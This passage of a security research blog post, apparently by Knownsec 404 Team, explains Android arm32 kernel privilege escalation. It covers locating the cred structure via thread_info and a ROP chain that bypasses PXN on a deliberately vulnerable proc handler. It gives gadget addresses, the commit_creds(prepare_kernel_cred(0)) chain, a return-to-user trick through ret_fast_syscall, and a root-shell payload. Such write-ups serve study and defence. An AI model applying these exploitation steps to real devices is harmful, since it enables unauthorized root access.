@@ -1,0 +1,199 @@
+            kernel_cap_t    cap_bset;       /* capability bounding set */
+            kernel_cap_t    cap_ambient;    /* Ambient capability set */
+    #ifdef CONFIG_KEYS
+            unsigned char   jit_keyring;    /* default keyring to attach requested
+                                             * keys to */
+            struct key __rcu *session_keyring; /* keyring inherited over fork */
+            struct key      *process_keyring; /* keyring private to this process */
+            struct key      *thread_keyring; /* keyring private to this thread */
+            struct key      *request_key_auth; /* assumed request_key authority */
+    #endif
+    #ifdef CONFIG_SECURITY
+            void            *security;      /* subjective LSM security */
+    #endif
+            struct user_struct *user;       /* real user ID subscription */
+            struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
+            struct group_info *group_info;  /* supplementary groups for euid/fsgid */
+            struct rcu_head rcu;            /* RCU deletion hook */
+    };
+    ......
+Each process has a separate `thread_info` structure. Let's see how the kernel
+gets information about the `thread_info` structure of each process:
+    #define THREAD_SIZE             8192
+    ......
+    static inline struct thread_info *current_thread_info(void)
+    {
+            register unsigned long sp asm ("sp");
+            return (struct thread_info *)(sp & ~(THREAD_SIZE - 1));
+    }
+There is size limit in the kernel stack, and the size of the stack in arm32 is
+0x2000, while the information of `thread_info` is stored at the bottom of the
+stack.
+So, if we can get one of the stack addresses where the current process is
+running in the kernel, we can find `thread_info`, which will give us the
+address of `cred`, and if we can write the kernel arbitrarily, we can modify
+the information of `cred` to achieve privilege escalation.
+In general, there is only one way to the kernel privilege escalation-- modify
+the cred information, while `commit_creds(prepare_kernel_cred(0));` is just a
+function provided by the kernel to modify the cred.
+Display cred data via gdb:
+    $ shell@generic:/ $ id
+    id
+    uid=2000(shell) gid=1007(log) context=u:r:init_shell:s0
+    --------------------------------------
+We can get `$sp : 0xd415bf40` via gdb, and calculate the bottom address of the
+stack: 0xd415a000.
+Then we can get the information of `thread_info`, as well as the address of
+`task_struct`\-- 0xd4d16680.
+![
+](https://images.seebug.org/content/images/2019/02/8e7759ae-9c62-4287-a3a4-58fb7b05008a.png-w331s)
+Then we look over the information of `task_struct` and get the address of
+cred: 0xd4167780.
+    gef> p *(struct task_struct *)0xd4d16680
+    $2 = {
+    ......
+            real_cred = 0xd4167780, 
+            cred = 0xd4167780,
+    ......
+    # 数据太长了，就不截图了
+Look over the information of cred:
+![
+](https://images.seebug.org/content/images/2019/02/3de8b38b-b41b-48b4-a034-c075f7b8557f.png-w331s)
+Convert the hex for uid and gid to decimal, and find out that it is just the
+permissions of the current process.
+## Use ROP to bypass PXN for Android privilege escalation
+Next is about how to exploit the vulnerability to perform privilege
+escalation. Because it studies the utilization method, I have created a basic
+stack overflow.
+    int proc_entry_write(struct file *file, const char __user *ubuf, unsigned long count, void *data)
+    {
+        char buf[MAX_LENGTH];
+        if (copy_from_user(&buf, ubuf, count)) {
+            printk(KERN_INFO "stackBufferProcEntry: error copying data from userspace\n");
+            return -EFAULT;
+        }
+        return count;
+    }
+I can't use shellcode because PXN is on, and then the first idea that comes to
+my mind is using ROP to perform shellcode operations.
+Do not use `ROPgadget`, which takes a long time to run ELF in kernel, and
+ROPPER is recommended [4].
+    $ ropper -f /mnt/hgfs/tmp/android_kernel/ranchu_3.10_vmlinux --nocolor > ranchu_ropper_gadget
+Then we find the address of the two functions: `commit_creds` and
+`prepare_kernel_cred`. They are in the kernel without kalsr enabled. We can
+send vmlinux directly into IDA to find out the address of these two functions.
+Until now, we can construct the following rop chain:
+    *pc++ = 0x41424344;      // r4
+    *pc++ = 0xC00B8D68;      // ; mov r0, #0; pop {r4, pc}
+    *pc++ = 0x41424344;      // r4
+    *pc++ = 0xC00430F4;      // ; prepare_kernel_cred(0) -> pop {r3-r5, pc}
+    *pc++ = 0x41424344;      // r3
+    *pc++ = 0x41424344;      // r4
+    *pc++ = 0x41424344;      // r5
+    *pc++ = 0xC0042BFC;      // ; commit_creds -> pop {r4-r6, pc}
+    *pc++ = 0x41424344;      // r4
+    *pc++ = 0x41424344;      // r5
+    *pc++ = 0x41424344;      // r6
+Having modified the permissions of the current process successfully, we need
+to switch the current process from the kernel mode back to the user mode, and
+then execute `/bin/sh` in the user mode, thus the privilege escalation is
+successful.
+But there is a problem. What I use in shellcode is:
+    "mov r3, #0x40000010\n\t"
+    "MSR    CPSR_c,R3\n\t"
+    "LDR     R3, =0x879c\n\t"     // payload function addr
+    "BLX     R3\n\t"
+And I can easily find the gadget: `msr cpsr_c, r4; pop {r4, pc};`.
+However, there is no way to successfully switch back to the user mode. There
+is almost no relevant information on the Internet, and I can't find the cause
+of the problem. After executing the `msr cpsr_c, r4` command, the stack
+information will change, resulting in a failure to control the jump of the pc.
+Later on, I track the execution of the kernel and find out that the kernel
+itself switches back to user mode via the `ret_fast_syscall` function:
+    $ cat ./arch/arm/kernel/entry-common.S
+    ......
+    ret_fast_syscall:
+     UNWIND(.fnstart        )
+     UNWIND(.cantunwind     )
+            disable_irq                             @ disable interrupts
+            ldr     r1, [tsk, #TI_FLAGS]
+            tst     r1, #_TIF_WORK_MASK
+            bne     fast_work_pending
+            asm_trace_hardirqs_on
+            /* perform architecture specific actions before user return */
+            arch_ret_to_user r1, lr
+            ct_user_enter
+            restore_user_regs fast = 1, offset = S_OFF
+     UNWIND(.fnend          )
+    ......
+    -----------------------------       0xc000df80 :   cpsid   i
+       0xc000df84 : ldr r1, [r9]
+       0xc000df88 : tst r1, #7
+       0xc000df8c : bne 0xc000dfb0 
+       0xc000df90 :    ldr r1, [sp, #72]   ; 0x48
+       0xc000df94 :    ldr lr, [sp, #68]!  ; 0x44
+       0xc000df98 :    msr SPSR_fsxc, r1
+       0xc000df9c :    clrex
+       0xc000dfa0 : ldmdb  sp, {r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12, sp, lr}
+       0xc000dfa4 :    nop; (mov r0, r0)
+       0xc000dfa8 :    add sp, sp, #12
+       0xc000dfac :    movs    pc, lr
+In my tests, I find that it can successfully switch from kernel mode to user
+mode by using `msr SPSR_fsxc, r1`, but this instruction only exists before
+this function, so I could not find the relevant gadget. Having thought about
+many ways to use this function, the final way to test successfully is as
+follows.
+Calculate the distance between the stack of the overflow function with
+vulnerability and the `ret_fast_syscall` function stack. After executing
+`commit_creds(prepare_kernel_cred(0));` with ROP, use the appropriate gadget
+to modify the stack address (eg: `add sp, sp, #0x30; pop {r4, r5, r6, pc};`),
+then control pc to jump to `0xc000df90 :`, thus the
+program has finished executing the syscall of the kernel. Then switch back to
+the user process code to continue execution. After executing the following
+function in our user mode code, we can successfully achieve the privilege
+escalation.
+    void payload(void)
+    {        
+            if (getuid() == 0) {
+                    execl("/system/bin/sh", "sh", NULL);
+            } else {
+                    warnx("failed to get root. How did we even get here?");
+            }
+            _exit(0);
+    }
+The full exp can be found on my Github.
+ROP is just one of the utilization methods, and I will continue to explore
+other methods and the exploits under 64-bit Android.
+# Reference
+  1. 
+  2. 
+  3. 
+  4. 
+# About Knownsec & 404 Team
+Beijing Knownsec Information Technology Co., Ltd. was established by a group
+of high-profile international security experts. It has over a hundred frontier
+security talents nationwide as the core security research team to provide
+long-term internationally advanced network security solutions for the
+government and enterprises.
+Knownsec's specialties include network attack and defense integrated
+technologies and product R&D under new situations. It provides visualization
+solutions that meet the world-class security technology standards and enhances
+the security monitoring, alarm and defense abilities of customer networks with
+its industry-leading capabilities in cloud computing and big data processing.
+The company's technical strength is strongly recognized by the State Ministry
+of Public Security, the Central Government Procurement Center, the Ministry of
+Industry and Information Technology (MIIT), China National Vulnerability
+Database of Information Security (CNNVD), the Central Bank, the Hong Kong
+Jockey Club, Microsoft, Zhejiang Satellite TV and other well-known clients.
+404 Team, the core security team of Knownsec, is dedicated to the research of
+security vulnerability and offensive and defensive technology in the fields of
+Web, IoT, industrial control, blockchain, etc. 404 team has submitted
+vulnerability research to many well-known vendors such as Microsoft, Apple,
+Adobe, Tencent, Alibaba, Baidu, etc. And has received a high reputation in the
+industry.
+The most well-known sharing of Knownsec 404 Team includes: [KCon Hacking
+Conference](http://kcon.knownsec.com/#/ "KCon Hacking Conference"), [Seebug
+Vulnerability Database](https://www.seebug.org/ "Seebug Vulnerability
+Database") and [ZoomEye Cyberspace Search Engine](https://www.zoomeye.org/
+"ZoomEye Cyberspace Search Engine").
+* * *
